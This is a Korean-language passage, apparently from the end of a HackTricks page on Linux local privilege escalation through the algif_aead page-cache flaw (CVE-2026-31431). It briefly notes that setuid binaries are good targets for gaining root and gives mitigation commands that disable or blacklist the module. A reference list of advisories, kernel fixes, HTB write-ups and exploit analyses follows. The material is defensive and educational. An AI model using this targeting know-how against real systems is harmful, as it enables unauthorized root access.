- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead`를 모듈로 로드하거나 언로드할 수 있습니다
- `CONFIG_CRYPTO_USER_API_AEAD=y`: 인터페이스가 커널에 내장됩니다
- setuid 바이너리는 좋은 대상입니다. page-cache 전용 패치만으로도 로컬 foothold를 root로 전환할 수 있기 때문입니다

#### `algif_aead` 경로의 공격 표면 축소

취약한 인터페이스가 로드 가능한 모듈로 제공되는 경우:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

커널에 컴파일되어 있다면, 일부 보고 사례에서는 다음을 사용해 init 경로를 차단한다고 했습니다:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

이러한 종류의 완화책은 다른 kernel LPE에서도 기억해 둘 가치가 있습니다. 공격이 특정 선택적 인터페이스에 의존한다면, 해당 인터페이스를 비활성화하거나 blacklist에 추가하면 전체 kernel 업그레이드가 가능해지기 전에도 exploit 경로를 차단할 수 있습니다.<sup>[[6]](#references)[[28]](#references)</sup>



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [HTB Bamboo – 사용자가 쓸 수 있는 PaperCut 디렉터리에서 root 권한으로 실행되는 스크립트 탈취](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431에 관한 Openwall oss-security 공개 내용](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable 수정 사항: crypto: algif_aead - in-place 방식으로 작동하던 것을 되돌림](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 권고문](https://copy.fail/)
- [7] [Theori / Xint 기술 분석 글](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone 저장소 / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE 변종 DirtyClone (CVE-2026-43503) 분석 및 exploit](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux 수정 사항: net: skb: `__pskb_copy_fclone()`에서 `SKBFL_SHARED_FRAG` 유지 (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux의 이전 완화책: splice된 UDP 패킷에 `SKBFL_SHARED_FRAG` 설정 (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux man 페이지](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux man 페이지](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian man 페이지](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel 문서](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME 애플리케이션 연결](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info 사양](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry 사양](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig 언어](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG 페이지 캐시 취약점](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux man 페이지](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` 문서](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` 문서](https://git-scm.com/docs/git-ls-tree)
- [33] [Git 설정 문서](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux man 페이지](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd generator 문서](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux 탐지 엔지니어링: 지속성 메커니즘](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
- [37] [0xdf — HTB: MakeSense](https://0xdf.gitlab.io/2026/10/31/htb-makesense.html)
